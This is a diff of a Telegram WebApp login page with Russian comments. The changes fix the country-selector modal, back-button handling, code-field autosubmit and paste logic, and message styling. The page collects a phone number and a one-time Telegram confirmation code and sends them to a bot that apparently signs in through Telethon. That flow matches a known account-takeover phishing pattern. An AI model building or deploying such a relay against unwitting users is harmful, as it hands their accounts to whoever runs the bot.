@@ -37,8 +37,6 @@
         }
         
         /* Стилизация элементов в модальном окне */
-        /* Применен класс card-bg к содержимому модального окна в HTML */
-
         .country-item-modal:hover {
             /* Используем основной цвет фона Telegram для эффекта при наведении */
             background-color: var(--tg-theme-bg-color); 
@@ -72,11 +70,6 @@
     <!-- Основной контейнер с адаптивным центрированием -->
     <div class="w-full max-w-md">
         
-        <!-- Заголовок иконка (Скрыта, т.к. иконка теперь внутри шагов) -->
-        <div id="common-header" class="text-center mb-8 hidden">
-            <!-- Здесь была общая иконка, теперь она внутри шагов -->
-        </div>
-
         <!-- Контейнер для сообщений -->
         <div id="message-container" class="mb-4 p-3 rounded-lg hidden" role="alert">
             <p id="message-text" class="text-sm"></p>
@@ -189,7 +182,6 @@
 
     <!-- Модальное окно выбора страны (появляется снизу) -->
     <div id="country-modal" class="fixed inset-0 z-50 bg-black bg-opacity-70 flex items-end justify-center hidden">
-        <!-- КЛЮЧЕВОЕ ИСПРАВЛЕНИЕ: Добавлен card-bg для фона модального окна -->
         <div id="modal-content" class="card-bg w-full max-w-md rounded-t-xl shadow-2xl p-4 transform transition-transform duration-300 translate-y-full">
             <div class="flex justify-between items-center mb-4">
                 <h3 class="text-xl font-bold" style="color:var(--tg-theme-text-color);">Выберите страну</h3>
@@ -280,7 +272,7 @@
             
             initCountrySelector(); // Инициализация селектора
             initCodeInputs(); // Инициализация логики сегментированных полей
-            checkStep();
+            checkStep(); // Проверка, какой шаг нужно показать
         }
 
         /**
@@ -313,6 +305,7 @@
             
             countrySearchInput.focus();
             WebApp.BackButton.show();
+            WebApp.onEvent('backButtonClicked', closeModal); // Обработка кнопки "Назад" в WebApp
         }
 
         /**
@@ -325,6 +318,7 @@
                 countryModal.classList.add('hidden');
             }, 300);
             WebApp.BackButton.hide();
+            WebApp.offEvent('backButtonClicked', closeModal); // Удаляем обработчик после закрытия
         }
 
         /**
@@ -372,7 +366,6 @@
             // Обработчики модального окна
             countryPrefixButton.addEventListener('click', openModal);
             modalCloseButton.addEventListener('click', closeModal);
-            WebApp.onEvent('backButtonClicked', closeModal); // Обработка кнопки "Назад" в WebApp
 
             // Обработка поиска
             countrySearchInput.addEventListener('input', function() {
@@ -396,7 +389,7 @@
          */
         function initCodeInputs() {
             codeInputs.forEach((input, index) => {
-                // Очистка от нецифровых символов и ограничение длин
+                // Очистка от нецифровых символов и ограничение длины
                 input.addEventListener('input', (e) => {
                     input.value = input.value.replace(/\D/g, '').slice(0, 1);
                     if (input.value.length === 1) {
@@ -406,7 +399,10 @@
                         } else {
                             // Последнее поле: снимаем фокус и отправляем форму
                             input.blur();
-                            codeForm.dispatchEvent(new Event('submit'));
+                            // Только если все поля заполнены, отправляем форму
+                            if (codeInputs.every(i => i.value.length === 1)) {
+                                codeForm.dispatchEvent(new Event('submit'));
+                            }
                         }
                     }
                 });
@@ -432,12 +428,14 @@
                     for (let i = 0; i < pasteData.length; i++) {
                         if (index + i < codeInputs.length) {
                             codeInputs[index + i].value = pasteData[i];
-                            // Переводим фокус на следующее после вставки
-                            if (index + i < codeInputs.length - 1) {
-                                codeInputs[index + i + 1].focus();
-                            } else {
+                            
+                            if (index + i === codeInputs.length - 1) {
+                                // Если заполнили последнее поле
                                 codeInputs[index + i].blur();
                                 codeForm.dispatchEvent(new Event('submit'));
+                            } else if (index + i < codeInputs.length - 1) {
+                                // Переводим фокус на следующее после вставки
+                                codeInputs[index + i + 1].focus();
                             }
                         }
                     }
@@ -447,9 +445,11 @@
             // Обработчик для ссылки "Отправить еще раз"
             sendAgainLink.addEventListener('click', (e) => {
                 e.preventDefault();
-                displayMessage('Запрос на повторную отправку кода будет отправлен боту.', 'info');
-                // В реальном приложении здесь должна быть логика отправки запроса боту 
-                // на повторную отправку кода (WebApp.sendData с другим step/payload).
+                displayMessage('Запрос на повторную отправку кода. Если бот его примет, он пришлет вам новую кнопку для ввода кода.', 'info');
+                
+                // В реальном приложении: отправка запроса боту на повторную отправку кода.
+                // Так как в Telethon это сложнее (нужен другой call), мы здесь просто показываем сообщение, 
+                // но в идеале нужно отправить WebApp.sendData({ step: 'resend_code' })
             });
         }
 
@@ -500,11 +500,18 @@
 
             if (type === 'error') {
                 messageContainer.classList.add('bg-red-800/20', 'text-red-300');
+                messageContainer.style.backgroundColor = WebApp.themeParams.hint_color ? `${WebApp.themeParams.hint_color}30` : '#3d3d3d'; // Темный фон для ошибки
+                messageText.style.color = WebApp.themeParams.destructive_text_color || '#ff6666';
             } else if (type === 'success') {
                 messageContainer.classList.add('bg-green-800/20', 'text-green-300');
+                messageContainer.style.backgroundColor = WebApp.themeParams.hint_color ? `${WebApp.themeParams.hint_color}30` : '#3d3d3d';
+                messageText.style.color = WebApp.themeParams.link_color || '#66ff66';
             } else {
                 messageContainer.classList.add('bg-blue-800/20', 'text-blue-300');
+                messageContainer.style.backgroundColor = WebApp.themeParams.secondary_bg_color || '#3d3d3d';
+                messageText.style.color = WebApp.themeParams.text_color || '#ffffff';
             }
+            messageContainer.classList.remove('hidden');
         }
 
         /**
@@ -532,7 +539,7 @@
             phoneButton.disabled = true;
             phoneButton.innerText = 'Отправка...';
 
-            displayMessage(`Отправка номера телефона ${fullPhone} боту...`);
+            displayMessage(`Отправка номера телефона ${fullPhone} боту...`, 'info');
 
             // Отправка данных боту
             const data = {
@@ -541,7 +548,7 @@
             };
             
             try {
-                // WebApp.sendData закрывает WebApp. Бот обработает данные.
+                // WebApp.sendData закрывает WebApp и отправляет данные боту.
                 WebApp.sendData(JSON.stringify(data));
             } catch (error) {
                 displayMessage('Ошибка при отправке данных в Telegram: ' + error.message, 'error');
@@ -573,7 +580,7 @@
             codeButton.disabled = true;
             codeButton.innerText = 'Подтверждение...';
 
-            displayMessage('Проверка кода...');
+            displayMessage('Проверка кода...', 'info');
 
             // Отправка данных боту
             const data = {
